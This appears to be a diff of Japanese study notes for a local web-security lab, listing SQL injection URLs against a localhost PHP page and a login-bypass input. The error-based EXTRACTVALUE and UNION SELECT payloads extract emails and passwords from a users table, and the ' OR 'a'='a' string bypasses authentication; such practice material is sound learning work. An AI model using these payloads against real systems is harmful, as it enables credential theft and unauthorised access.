@@ -1,3 +1,13 @@
-http://localhost/websecurity/sql/select_basic.php?author='+AND+EXTRACTVALUE(0,(SELECT+CONCAT('$',email,':',password)+FROM+users+LIMIT+0,1))+%23
+http://localhost:8080/websecurity/sql/select_basic.php?author=鈴木太郎
 
-http://localhost/websecurity/sql/select_basic.php?author='+UNION+SELECT+email,password,NULL,NULL+FROM+users--+
+http://localhost:8080/websecurity/sql/select_basic.php?author='+AND+EXTRACTVALUE(0,(SELECT+CONCAT('$',email,':',password)+FROM+users+LIMIT+0,1))+%23
+
+http://localhost:8080/websecurity/sql/select_basic.php?author='+UNION+SELECT+email,password,NULL,NULL+FROM+users--+
+
+ログイン認証回避
+
+正式な入力
+suzuki@example.com / pass
+
+攻撃用入力
+' OR 'a' = 'a' ; -- 
